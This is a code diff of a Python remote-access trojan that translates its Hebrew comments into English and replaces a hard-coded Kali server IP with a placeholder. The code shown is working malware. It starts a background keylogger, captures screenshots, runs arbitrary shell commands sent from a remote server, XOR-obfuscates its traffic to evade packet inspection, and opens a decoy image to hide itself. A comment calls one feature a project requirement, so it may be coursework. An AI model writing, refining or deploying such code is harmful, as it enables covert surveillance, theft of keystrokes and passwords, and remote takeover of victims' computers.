@@ -12,28 +12,29 @@ import subprocess
 from pynput.keyboard import Listener
 from PIL import ImageGrab
 
-# --- הגדרות חיבור ---
-# וודא שה-IP מעודכן לכתובת של מכונת ה-Kali שלך
-SERVER_HOST = "192.168.1.140" 
+# --- Connection Settings ---
+# Replace this with your server's IP address
+SERVER_HOST = "SERVER_IP"
 SERVER_PORT = 8080
-# מפתח פשוט להצפנת XOR כדי לעקוף זיהוי בסיסי של חבילות מידע
+# Simple XOR key used for basic traffic obfuscation
 KEY = b'simple_xor_key'
 
-# פונקציית הצפנה/פענוח XOR
+# XOR encryption/decryption function
 def xor_crypt(data: bytes) -> bytes:
     return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))
 
-# פונקציה לשליחת הודעות מובנות (JSON) מוצפנות
+# Send encrypted JSON messages
 def send_msg(sock, obj):
     try:
         raw = json.dumps(obj).encode()
         enc = xor_crypt(raw)
-        # שליחת אורך ההודעה ב-4 הבייטים הראשונים
+        # Send the payload length as the first 4 bytes.
         length = len(enc).to_bytes(4, 'big')
         sock.sendall(length + enc)
-    except: pass
+    except:
+        pass
 
-# פונקציה לקבלת הודעות ופענוחן
+# Receive and decrypt messages
 def recv_msg(sock):
     length_bytes = sock.recv(4)
     if not length_bytes: raise ConnectionError()
@@ -46,7 +47,7 @@ def recv_msg(sock):
     dec = xor_crypt(data)
     return json.loads(dec.decode('latin-1'))
 
-# פונקציה לחישוב SHA256 של קובץ (דרישת פרויקט)
+# Compute SHA256 for a file (project requirement)
 def handle_hash(sock, filename):
     try:
         target = filename if filename else "logs.txt"
@@ -61,7 +62,7 @@ def handle_hash(sock, filename):
     except Exception as e:
         send_msg(sock, {"result": f"[-] Hash error: {str(e)}"})
 
-# פונקציה לצילום מסך ושליחתו כטקסט Base64
+# Capture a screenshot and send it as Base64 text
 def handle_screencap(sock):
     try:
         screenshot = ImageGrab.grab()
@@ -72,7 +73,7 @@ def handle_screencap(sock):
     except Exception as e:
         send_msg(sock, {"result": f"[-] Screenshot failed: {e}"})
 
-# פונקציית Keylogger - הקלטת הקשות ושמירתן לקובץ מקומי
+# Keylogger function - log keystrokes to a local file
 def start_keylogger():
     def on_press(key):
         with open("logs.txt", "a") as f:
@@ -80,15 +81,15 @@ def start_keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-# הלוגיקה המרכזית של החיבור והסוואת התמונה
+# Main connection logic and decoy image display
 def connecting():
-    # פתיחת תמונת ההסוואה במידה והיא קיימת בתיקייה
+    # Open the decoy image if it exists in the folder
     if os.path.exists("image.jpg"):
         subprocess.Popen("start image.jpg", shell=True)
 
     while True:
         try:
-            # ניסיון התחברות לשרת (ה-Kali)
+            # Attempt to connect to the server
             s = socket.socket()
             s.connect((SERVER_HOST, SERVER_PORT))
             
@@ -96,12 +97,12 @@ def connecting():
                 msg = recv_msg(s)
                 action = msg.get("action")
 
-                # פקודת יציאה וסגירת התהליך
+                # Terminate and close the process
                 if action == "terminate":
                     s.close()
                     os._exit(0)
                 
-                # קבלת לוג ההקשות מהקובץ
+                # Retrieve the keystroke log file
                 elif action == "keylog":
                     if os.path.exists("logs.txt"):
                         with open("logs.txt", "r") as f:
@@ -109,29 +110,29 @@ def connecting():
                     else:
                         send_msg(s, {"result": "[-] No logs found."})
                 
-                # הפעלת צילום מסך
+                # Trigger screenshot capture
                 elif action == "screencap":
                     handle_screencap(s)
                 
-                # הפעלת חישוב Hash
+                # Trigger hash computation
                 elif action == "hash":
                     handle_hash(s, msg.get("filename"))
                 
-                # הרצת פקודות מערכת (Shell) וקבלת הפלט
+                # Execute shell commands and return output
                 else:
                     proc = subprocess.Popen(action, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     result = proc.stdout.read() + proc.stderr.read()
                     send_msg(s, {"result": result.decode('latin-1')})
         except:
-            # במידה והשרת לא זמין, המתנה של 10 שניות וניסיון חוזר
+            # If the server is unavailable, wait 10 seconds and retry
             time.sleep(10)
 
-# פונקציית הכניסה הראשית
+# Main entry function
 def main():
-    # הרצת ה-Keylogger ב-Thread (תהליכון) נפרד כדי שלא יעצור את התקשורת
+    # Start the keylogger on a separate thread so it does not block networking
     t = threading.Thread(target=start_keylogger, daemon=True)
     t.start()
-    # התחלת לוגיקת החיבור
+    # Start connection logic
     connecting()
 
 if __name__ == "__main__":
